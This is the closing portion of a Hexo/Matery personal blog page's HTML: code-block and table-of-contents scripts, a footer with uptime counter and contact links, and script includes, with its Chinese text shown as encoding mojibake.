        function loadCodeBlockScripts() {
            if (typeof $ !== 'undefined') {
                // æŒ‰é¡ºåºåŠ è½½ä»£ç å—ç›¸å…³è„šæœ¬
                loadScript('/libs/codeBlock/codeBlockFuction.js', function() {
                    
                    loadScript('/libs/codeBlock/codeLang.js', function() {
                        
                        loadScript('/libs/codeBlock/codeCopy.js', function() {
                            
                            loadScript('/libs/codeBlock/codeShrink.js');
                            
                        });
                        
                    });
                    
                });
            } else {
                // jQueryæœªåŠ è½½ï¼Œå»¶è¿Ÿé‡è¯•
                setTimeout(loadCodeBlockScripts, 100);
            }
        }
        
        // å¦‚æœDOMå·²åŠ è½½ï¼Œç«‹å³å°è¯•ï¼›å¦åˆ™ç­‰å¾…DOMåŠ è½½å®Œæˆ
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', loadCodeBlockScripts);
        } else {
            // DOMå·²åŠ è½½ï¼Œä½†å¯èƒ½jQueryè¿˜æ²¡åŠ è½½ï¼Œå»¶è¿Ÿä¸€ç‚¹å†è¯•
            setTimeout(loadCodeBlockScripts, 200);
        }
    })();
</script>

<!-- ä»£ç å—æŠ˜è¡Œ -->


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down" style="padding-right: 0;">
        <div class="toc-widget" style="margin-left: auto; margin-right: 0;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color tooltipped" data-tooltip="å±•å¼€ç›®å½•" data-position="left" data-delay="50" id="toc-toggle-btn">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js" defer></script>
<script>
    // ç­‰å¾…jQueryå’ŒtocbotåŠ è½½å®Œæˆåå†åˆå§‹åŒ–
    (function() {
        function initTocbot() {
            // æ£€æŸ¥jQueryå’Œtocbotæ˜¯å¦éƒ½å·²åŠ è½½
            if (typeof $ !== 'undefined' && typeof tocbot !== 'undefined' && $('#articleContent').length > 0) {
                try {
                    // æ£€æŸ¥æ˜¯å¦æœ‰æ ‡é¢˜å…ƒç´ 
                    var headingSelector = 'h1, h2, h3, h4, h5, h6';
                    var headings = $('#articleContent').find(headingSelector);
                    if (headings.length === 0) {
                        console.log('æ–‡ç« ä¸­æ²¡æœ‰æ‰¾åˆ°æ ‡é¢˜å…ƒç´ ï¼Œæ— æ³•ç”Ÿæˆç›®å½•');
                        return;
                    }
                    
                    // åˆå§‹åŒ–tocbot
                    tocbot.init({
                        tocSelector: '#toc-content',
                        contentSelector: '#articleContent',
                        headingsOffset: -($(window).height() * 0.4 - 45),
                        collapseDepth: Number('0'),
                        headingSelector: 'h1, h2, h3, h4, h5, h6'
                    });
                    
                    // æ£€æŸ¥ç›®å½•æ˜¯å¦ç”ŸæˆæˆåŠŸ
                    setTimeout(function() {
                        if ($('#toc-content').children().length === 0) {
                            console.warn('ç›®å½•ç”Ÿæˆå¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ç« æ ‡é¢˜æ ¼å¼');
                        }
                    }, 500);
                    
                    // å¼ºåˆ¶å±•å¼€æ‰€æœ‰ç›®å½•é¡¹
                    setTimeout(function() {
                        $('#toc-content .is-collapsed').removeClass('is-collapsed').addClass('is-collapsible');
                        $('#toc-content .is-collapsible').css('max-height', '1000px');
                    }, 100);

                    // modify the toc link href to support Chinese.
                    let i = 0;
                    let tocHeading = 'toc-heading-';
                    $('#toc-content a').each(function () {
                        $(this).attr('href', '#' + tocHeading + (++i));
                    });

                    // modify the heading title id to support Chinese.
                    i = 0;
                    $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
                        $(this).attr('id', tocHeading + (++i));
                    });

                    // Set scroll toc fixed.
                    let tocHeight = parseInt($(window).height() * 0.4 - 64);
                    let $tocWidget = $('.toc-widget');
                    $(window).scroll(function () {
                        let scroll = $(window).scrollTop();
                        /* add post toc fixed. */
                        if (scroll > tocHeight) {
                            $tocWidget.addClass('toc-fixed');
                        } else {
                            $tocWidget.removeClass('toc-fixed');
                        }
                    });

                    
                    /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
                    let fixPostCardWidth = function (srcId, targetId) {
                        let srcDiv = $('#' + srcId);
                        if (srcDiv.length === 0) {
                            return;
                        }

                        let w = srcDiv.width();
                        if (w >= 450) {
                            w = w + 21;
                        } else if (w >= 350 && w < 450) {
                            w = w + 18;
                        } else if (w >= 300 && w < 350) {
                            w = w + 16;
                        } else {
                            w = w + 14;
                        }
                        $('#' + targetId).width(w);
                    };

                    // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
                    const expandedClass = 'expanded';
                    let $tocAside = $('#toc-aside');
                    let $mainContent = $('#main-content');
                    let $tocBtn = $('#floating-toc-btn .btn-floating');
                    
                    // åˆå§‹åŒ– tooltip - æ ¹æ®å½“å‰ç›®å½•çŠ¶æ€è®¾ç½®æç¤ºæ–‡å­—
                    function updateTooltip() {
                        if (typeof M !== 'undefined' && M.Tooltip) {
                            let instance = M.Tooltip.getInstance($tocBtn[0]);
                            if (instance) {
                                instance.destroy();
                            }
                            let tooltipText = $tocAside.hasClass(expandedClass) ? 'éšè—ç›®å½•' : 'å±•å¼€ç›®å½•';
                            M.Tooltip.init($tocBtn[0], {
                                html: tooltipText,
                                position: 'left'
                            });
                        }
                    }
                    
                    // åˆå§‹åŒ– tooltip
                    updateTooltip();
                    
                    $tocBtn.click(function () {
                        if ($tocAside.hasClass(expandedClass)) {
                            $tocAside.removeClass(expandedClass).hide();
                            $mainContent.removeClass('l9');
                        } else {
                            $tocAside.addClass(expandedClass).show();
                            $mainContent.addClass('l9');
                        }
                        // æ›´æ–° tooltip æ–‡æœ¬
                        updateTooltip();
                        fixPostCardWidth('artDetail', 'prenext-posts');
                    });
                    
                } catch (e) {
                    console.error('TOCåˆå§‹åŒ–é”™è¯¯:', e);
                }
            } else {
                // å¦‚æœä¾èµ–æœªåŠ è½½å®Œæˆï¼Œå»¶è¿Ÿé‡è¯•
                setTimeout(initTocbot, 100);
            }
        }
        
        // å¦‚æœDOMå·²åŠ è½½ï¼Œç«‹å³å°è¯•åˆå§‹åŒ–ï¼›å¦åˆ™ç­‰å¾…DOMåŠ è½½å®Œæˆ
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initTocbot);
        } else {
            // DOMå·²åŠ è½½ï¼Œä½†å¯èƒ½jQueryæˆ–tocbotè¿˜æ²¡åŠ è½½ï¼Œå»¶è¿Ÿä¸€ç‚¹å†è¯•
            setTimeout(initTocbot, 200);
        }
    })();
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            
            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
                <a href="https://beian.miit.gov.cn/" target="_blank">è‹ICPå¤‡2020057407å·-1</a>
            </span>
            
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            Copyright&nbsp;&copy;
            <span id="year">2020</span>
            <a href="/about" target="_blank">Ab4nd0n</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/Ab4ndon" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                class="white-color">67.6k</span>&nbsp;å­—
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;æ¬¡
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;äºº
            </span>
            
            
            |&nbsp;<span id="sitetime">è½½å…¥è¿è¡Œæ—¶é—´...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2020";
                    var startMonth = "6";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffDays + " å¤© " + diffHours +
                            " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffYears + " å¹´ " + diffDays +
                            " å¤© " + diffHours + " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Ab4ndon" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2829493640@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2829493640" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 2829493640" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>
<script src="/js/prism/prism.js" async></script>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <!-- å…³é”®è„šæœ¬ï¼šjQueryå’ŒMaterializeéœ€è¦ä¼˜å…ˆåŠ è½½ï¼ˆé¦–é¡µè½®æ’­ç­‰åŠŸèƒ½ä¾èµ–ï¼‰ -->
    <script src="/libs/jquery/jquery.min.js"></script>
    <script src="/libs/materialize/materialize.min.js"></script>
    
    <!-- æ ¸å¿ƒåŠŸèƒ½è„šæœ¬ -->
    <script src="/js/matery.js"></script>
    
    <!-- éå…³é”®è„šæœ¬ï¼šä½¿ç”¨deferå»¶è¿ŸåŠ è½½ï¼Œä¸é˜»å¡é¡µé¢æ¸²æŸ“ -->
    <script src="/libs/aos/aos.js" defer></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js" defer></script>
    <script src="/js/FunnyTitle.js" defer></script>
    
    <!-- æ¡ä»¶åŠ è½½ï¼šmasonryä¸»è¦ç”¨äºæŸäº›é¡µé¢å¸ƒå±€ï¼Œé¦–é¡µé€šå¸¸ä¸éœ€è¦ -->
    
    <script src="/libs/masonry/masonry.pkgd.min.js" defer></script>
    
    
    <!-- lightgalleryä¸»è¦ç”¨äºæ–‡ç« é¡µå›¾ç‰‡å±•ç¤ºï¼Œé¦–é¡µå»¶è¿ŸåŠ è½½ -->
    
    <script src="/libs/lightGallery/js/lightgallery-all.min.js" defer></script>
    
    
    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

    <!-- <script type="text/javascript">
        //Ö»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ğ§
        var windowWidth = $(window).width();
        if (windowWidth > 768) {
            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
        }
        </script> --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
        

</body>

</html>
